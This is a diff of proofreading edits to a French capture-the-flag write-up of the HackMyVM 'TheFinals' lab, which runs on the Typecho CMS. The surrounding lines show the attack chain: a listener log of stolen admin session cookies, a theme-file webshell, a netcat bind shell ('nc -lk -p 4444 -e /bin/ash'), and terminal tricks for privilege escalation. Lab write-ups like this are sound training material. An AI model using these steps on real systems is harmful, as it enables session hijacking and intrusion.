@@ -70,9 +70,9 @@ Le path `/blog` délivre un CMS qui ressemble à première vue à du Wordpress m
 <meta name="generator" content="Typecho 1.2.0" />
 ```
 
-À l'adresse `/blog/admin` interface est encore plus explicite avec le logo de l'application.
+À l'adresse `/blog/admin` l'interface est encore plus explicite avec le logo de l'application.
 
-J'ai ténté quelques identifiants et mot de passe, mais aucun résultat.
+J'ai tenté quelques identifiants et mot de passe, mais aucun résultat.
 
 Pour terminer le dossier `/screenshots` est intéressant : on y trouve des prises d'écran de l'interface administrateur du Typecho, en particulier la modération des commentaires.
 
@@ -101,7 +101,7 @@ func createPost(u string, cookies string, payload string) string {
     formData.Set("timezone", "7200")
 ```
 
-À regarder le code, les champs de formulaire ne correspondent pas tout à fait à ce qi est réellement envoyé lorsque j'ai envoyé un post.
+À regarder le code, les champs de formulaire ne correspondent pas tout à fait à ce qui est réellement envoyé lorsque j'ai soumis un commentaire.
 
 ```
 author=yolo&mail=truc%40bidule.com&url=&
@@ -146,9 +146,11 @@ On aura bien sûr pris soin de mettre un serveur web en écoute :
 192.168.56.104 - - [04/May/2025 15:00:03] "GET /7d07d00c3730d08dbac222ccaf73fd49__typecho_uid=1;%207d07d00c3730d08dbac222ccaf73fd49__typecho_authCode=%2524T%2524rNIwo0HHs7d96450c05b9caa710dfd5bbc4499ac2;%20PHPSESSID=8e8c2b3214af285bdeb9e74e6a0adaea HTTP/1.1" 404 -
 ```
 
-Maintenant, il faut injecter les cookies dans le navigateur. J'ai galéré avec `EditThisCookie` et je me dis que la prochaine fois, je vais utiliser un autre outil.
+Cookies volés !
 
-J'ai dû passer par l'option d'importer de cookies au format JSON. J'ai demandé de l'aide à ChatGPT et elle m'a proposé ce code :
+Maintenant, il faut les injecter dans le navigateur. J'ai galéré avec `EditThisCookie` et je me dis que la prochaine fois, j'utiliserais un autre outil.
+
+J'ai dû passer par l'option pour importer des cookies au format JSON. J'ai demandé de l'aide à ChatGPT et elle m'a proposé ce code :
 
 ```json
 [
@@ -213,7 +215,7 @@ return false;
 ?>
 ```
 
-Cette fois, j'ai assez de temps pour aller éditer un fichier du thème courant et ajouter un webshell :
+Cette fois, j'ai assez de temps pour modifier les cookies et aller éditer un fichier du thème courant afin d'ajouter un webshell :
 
 ![TheFinals webshell](/assets/img/hackmyvm/TheFinals_theme_editor.png)
 
@@ -252,7 +254,7 @@ flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
 
 ### Demi-finales
 
-On va passer à un shell un peu plus civilisé avec netcat (le système est un Alpine Linux et utilise les outils busybox) :
+On va passer à un shell un peu plus civilisé avec netcat (note: le système est un Alpine Linux et utilise les outils busybox) :
 
 ```bash
 nc -lk -p 4444 -e /bin/ash
@@ -264,13 +266,13 @@ Une fois sur le port 4444, j'obtiens un pty :
 python3 -c "import pty; pty.spawn('/bin/ash')"
 ```
 
-Là je remarque différentes choses dont ce processus :
+Là, je remarque différentes choses dont ce processus :
 
 ```bash
 2553 scotty    0:00 /usr/bin/python3 /home/scotty/cns_boardcast/main.py
 ```
 
-Ou encore un binaire setuid inconnu :
+Ou encore un binaire setuid inconnu (il s'est avéré legit plus tard) :
 
 ```
 ---s--x--x    1 root     root       13.9K Jan 18 02:12 /bin/bbsuid
@@ -278,7 +280,7 @@ Ou encore un binaire setuid inconnu :
 
 Ce dernier toutefois semble nécessiter des privilèges root (il râle au lancement).
 
-J'ai fouillé dans la base de données sans résultat (mot de passe solide) :
+J'ai fouillé dans la base de données sans résultat (hash trop costaud pour être cassé) :
 
 ```sql
 MariaDB [typecho_db]> select * from typecho_users;
@@ -419,9 +421,9 @@ thefinals:~$ sudo /sbin/secret
 /sbin/secret: line 2: can't create /dev/pts/99: Permission denied
 ```
 
-Le script veut utiliser `/dev/pts/99` comme terminal. On est actuellement sur le terminal 3.
+Le programme veut utiliser `/dev/pts/99` comme terminal. On est actuellement sur le terminal 3.
 
-On peu cependant créer de nouveaux terminaux virtuels avec la commande `exec` :
+On peut cependant créer de nouveaux terminaux virtuels avec la commande `exec` :
 
 ```console
 thefinals:~$ tty
@@ -447,7 +449,7 @@ thefinals:~$ ls /dev/pts/*
 /dev/pts/14    /dev/pts/20    /dev/pts/27    /dev/pts/33    /dev/pts/4     /dev/pts/46    /dev/pts/52    /dev/pts/59    /dev/pts/65    /dev/pts/71    /dev/pts/78    /dev/pts/84    /dev/pts/90    /dev/pts/97
 ```
 
-Pour le dernier, on se connecte en SSH puis sur le précédent shell, on relance la commande `secret` :
+Pour le dernier, on se connecte en SSH et on relance la commande `secret` :
 
 ```
 $ ssh -i key.priv scotty@thefinals.hmv
